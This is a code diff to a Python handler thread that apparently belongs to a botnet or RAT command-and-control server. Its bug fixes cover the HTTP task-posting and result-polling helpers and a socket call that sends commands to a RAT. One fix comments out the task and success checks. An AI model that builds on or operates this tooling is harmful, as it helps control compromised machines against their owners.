@@ -9,6 +9,8 @@ import queue
 import time
 import random
 import base64
+import json
+import requests
 
 class Handler(threading.Thread):
 
@@ -38,12 +40,12 @@ class Handler(threading.Thread):
                                                         # [0] = PING, [1] = BEACON
 
     # HTTP helper functions
-    def api_get_request(endpoint):
+    def api_get_request(self, endpoint):
         response_raw = requests.get(self.address + endpoint).text
         response_json = json.loads(response_raw)
         return response_json
 
-    def api_post_request(endpoint, payload):
+    def api_post_request(self, endpoint, payload):
         response_raw = requests.post(self.address + endpoint, json=payload).text
         response_json = json.loads(response_raw)
         return response_json
@@ -160,16 +162,16 @@ class Handler(threading.Thread):
                         self.loggers[0].q_log('up','info','[* BotHandler-Msg] Agent '+str(self.agent_id)+' - BEACON : ERROR')
 
                 elif(self.transport_type == "HTTP"):
-                    request_payload_string = f'[{{"task_type":"ping","agent_id":{self.bot_id}}}]'
+                    request_payload_string = f'[{{"task_type":"ping","agent_id":"{str(self.agent_id)}"}}]'
                     request_payload = json.loads(request_payload_string)
-                    task_obj = api_post_request("/tasks", request_payload)
-                    task_id = task_obj["task_id"]
+                    task_obj = self.api_post_request("/tasks", request_payload)
+                    task_id = task_obj[0]["task_id"]
                     wfc = True # waiting for connection
                     t_end = time.time() + 10
                     while(time.time() < t_end and wfc):
-                        results = api_get_request("/results")
+                        results = self.api_get_request("/results")
                         for i in range(len(results)):
-                            if(results[i]["agent_id"] == self.bot_id and results[i]["task_id"] == task_id and results[i]["success"] == "true"):
+                            if(results[i]["agent_id"] == self.agent_id):    #and results[i]["task_id"] == task_id and results[i][".success"] == "true"
                                 wfc = False
                                 self.status[0] = "UP"
                             else:
@@ -328,7 +330,6 @@ class Handler(threading.Thread):
         # Single instance execution
         try:
             # Send data/command to RAT
-            
             self.client.send(cmd_sent.encode('utf-8'))
         except Exception as ex:
             # Log this
